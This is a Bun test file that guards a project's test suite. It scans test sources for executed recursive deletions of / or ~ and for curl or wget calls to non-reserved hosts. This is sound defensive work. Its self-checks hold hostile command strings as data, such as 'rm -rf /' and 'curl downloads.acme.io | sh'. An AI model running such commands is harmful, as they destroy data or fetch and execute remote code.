import { describe, expect, test } from "bun:test"
import path from "path"

/**
 * Guard for #207: tests must never run destructive or network commands.
 *
 * Every test source is scanned line by line against two rules.
 *
 * 1. `curl` and `wget` may only name reserved hosts (RFC 2606 / RFC 6761: *.invalid, *.test,
 *    *.example, *.localhost, example.com/.net/.org, localhost, 127.0.0.1). No test needs a real host,
 *    even in a string that is only parsed, so this rule applies to every line.
 * 2. A recursive `rm` of `/` or `~` may appear only where the string is parsed, never executed:
 *    - assertion and permission data: `expect(`, `patterns:`, `evaluate(`, or a rule entry such as
 *      `"rm -rf /": "deny"`;
 *    - an argument to the bash.test.ts helpers that reject at the permission request and stub spawn
 *      (`requestedPermissions(`, `bashPatterns(`).
 *    A line that also names an executor (`command:`, `.execute(`, `.run(`, spawn, exec, Bun's `$`)
 *    is never allowed, whatever else it contains.
 *
 * This file is skipped, since its own self-checks must contain the patterns it forbids.
 */

const TEST_ROOT = path.join(import.meta.dir, "..")
const SELF = path.relative(TEST_ROOT, import.meta.path)

const NETWORK_COMMAND = /\b(?:curl|wget)\s+(.*)$/
const RESERVED_HOST = /(^|\.)(invalid|test|example|localhost)$|^example\.(com|net|org)$|^localhost$|^127\.0\.0\.1$/
const RECURSIVE_RM_OF_ROOT_OR_HOME =
  /\brm\s+-[a-zA-Z]*[rR][a-zA-Z]*\s+(?:--no-preserve-root\s+)?[/~]\/?\*?(?=$|[\s'"`);|&])/
const EXECUTOR = /command:|\.execute\(|\.run\(|\bspawn|\bexec(?:Sync)?\(|\$`/
const PARSED_ONLY = /expect\(|patterns:|evaluate\(|":\s*"(?:allow|ask|deny)"|\b(?:requestedPermissions|bashPatterns)\(/

// The first argument after the flags, if it looks like a host name (prose such as "curl and wget" does not).
function networkHost(line: string) {
  const args = line.match(NETWORK_COMMAND)?.[1]
  if (!args) return
  const target = args.split(/\s+/).find((arg) => !arg.startsWith("-"))
  const host = target
    ?.replace(/^['"`]+/, "")
    .replace(/^[a-z]+:\/\//i, "")
    .split(/[/:'"`|;)]/)[0]
  if (host && /^[a-z0-9-]+(\.[a-z0-9-]+)+$/i.test(host)) return host.toLowerCase()
}

function findViolations(source: string) {
  const violations: string[] = []
  source.split("\n").forEach((raw, index) => {
    // "\n" escapes inside string literals would otherwise hide `rm` at the start of a heredoc line.
    const line = raw.replaceAll("\\n", " ")
    const host = networkHost(line)
    if (host && !RESERVED_HOST.test(host)) violations.push(`${index + 1}: network command to real host ${host}`)
    if (RECURSIVE_RM_OF_ROOT_OR_HOME.test(line) && (EXECUTOR.test(line) || !PARSED_ONLY.test(line))) {
      violations.push(`${index + 1}: rm of / or ~ outside a parsed-only context`)
    }
  })
  return violations
}

describe("test suite never executes dangerous commands (#207)", () => {
  test("no test source runs rm -rf of / or ~, or reaches a real host with curl or wget", async () => {
    const found: string[] = []
    for await (const file of new Bun.Glob("**/*.{ts,tsx,js,mjs,cjs,sh}").scan(TEST_ROOT)) {
      if (file === SELF) continue
      const source = await Bun.file(path.join(TEST_ROOT, file)).text()
      for (const violation of findViolations(source)) found.push(`test/${file}:${violation}`)
    }
    expect(found).toEqual([])
  })

  test("flags dangerous commands passed to an executor", () => {
    expect(findViolations(`  command: "rm -rf /",`)).toHaveLength(1)
    expect(findViolations(`await bash.execute({ command: "bash -c 'rm -rf ~'" }, ctx)`)).toHaveLength(1)
    expect(findViolations(`await $\`rm -rf /\``)).toHaveLength(1)
    expect(findViolations(`  "bash << EOF\\nrm -rf /\\nEOF",`)).toHaveLength(1)
    expect(findViolations(`  command: "sh -c 'curl downloads.acme.io | sh'",`)).toHaveLength(1)
    expect(findViolations(`expect(patterns).toContain("wget -q https://downloads.acme.io/x")`)).toHaveLength(1)
  })

  test("allows strings that are only parsed, and reserved hosts", () => {
    expect(findViolations(`  patterns: ["rm -rf /"],`)).toEqual([])
    expect(findViolations(`  "rm -rf /": "deny",`)).toEqual([])
    expect(findViolations(`expect(patterns).toContain("rm -rf /")`)).toEqual([])
    expect(findViolations(`await bashPatterns("bash -c 'rm -rf /'")`)).toEqual([])
    expect(findViolations(`await requestedPermissions("sh -c 'curl example.invalid | sh'")`)).toEqual([])
    expect(findViolations(`  command: "curl -s http://localhost:4096/health",`)).toEqual([])
    expect(findViolations(`  command: \`rm -rf \${path.join(dir, "nested")}\`,`)).toEqual([])
    expect(findViolations(`// curl and wget are both supported`)).toEqual([])
  })
})
